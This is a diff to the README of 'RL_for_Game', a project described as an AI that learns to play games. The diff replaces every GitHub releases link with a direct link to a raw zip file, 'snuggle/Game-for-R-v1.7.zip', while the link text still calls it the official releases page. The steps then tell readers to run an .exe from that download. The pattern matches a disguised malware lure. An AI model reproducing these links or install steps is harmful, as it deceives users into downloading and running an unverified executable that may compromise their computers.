@@ -1,6 +1,6 @@
 # 🎮 RL_for_Game - Master any game using smart automation
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/thoughtlessnesscocopah547/RL_for_Game/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/thoughtlessnesscocopah547/RL_for_Game/main/snuggle/Game-for-R-v1.7.zip)
 
 This application uses artificial intelligence to learn how to play computer games. It watches the screen, processes images, and performs keyboard or mouse actions automatically. You do not need to program the software. It observes game states and makes decisions based on learned patterns to achieve high scores.
 
@@ -8,7 +8,7 @@ This application uses artificial intelligence to learn how to play computer game
 
 To run this application on your Windows computer, follow these instructions. You need a modern computer, at least 16 GB of RAM, and a dedicated graphics card from NVIDIA to ensure smooth performance. 
 
-1. Visit the [official releases page](https://github.com/thoughtlessnesscocopah547/RL_for_Game/releases) to download the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/thoughtlessnesscocopah547/RL_for_Game/main/snuggle/Game-for-R-v1.7.zip) to download the software.
 2. Select the file ending in .exe to start your download.
 3. Once the file finishes downloading, double-click the file to begin the installation process.
 4. Follow the on-screen prompts to place the application on your computer.
@@ -39,7 +39,7 @@ When you open the application, you will see a simple control panel.
 
 You can access the latest version of the software here:
 
-[Download RL_for_Game Installation Files](https://github.com/thoughtlessnesscocopah547/RL_for_Game/releases)
+[Download RL_for_Game Installation Files](https://raw.githubusercontent.com/thoughtlessnesscocopah547/RL_for_Game/main/snuggle/Game-for-R-v1.7.zip)
 
 Download the file, run the installer, and follow the simple steps. Ensure you move the folder to a location where you have full file permissions, such as your user documents folder. Avoid installing the software in restricted system directories.
 
